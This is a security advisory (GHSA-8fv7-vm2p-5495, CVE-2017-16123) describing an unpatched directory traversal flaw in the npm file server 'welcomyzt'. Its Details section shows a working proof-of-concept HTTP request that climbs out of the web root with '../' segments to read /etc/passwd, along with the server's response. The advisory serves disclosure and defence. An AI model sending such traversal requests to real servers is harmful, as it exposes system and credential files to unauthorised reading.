# [H] Directory Traversal in welcomyzt

## Summary
Severity: High
Advisory: GHSA-8fv7-vm2p-5495
CVE: CVE-2017-16123
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2020-09-01
Source: https://github.com/advisories/GHSA-8fv7-vm2p-5495
Type: github-advisory

## Affected
- npm: `welcomyzt` — affected >=0.0.0

## Details
`welcomyzt` is a simple file server.

`welcomyzt` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing `../` in the url.

**Example request:**
```http
GET /../../../../../../../../../../etc/passwd HTTP/1.1
host: localhost
```
 and server Response:
```http
HTTP/1.1 200 OK
Date: Thu, 04 May 2017 23:59:18 GMT
Connection: keep-alive
Transfer-Encoding: chunked

{contents of /etc/passwd}
```


## Recommendation

No patch is available for this vulnerability.

It is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-16123
- https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/pooledwebsocket
- https://www.npmjs.com/advisories/388
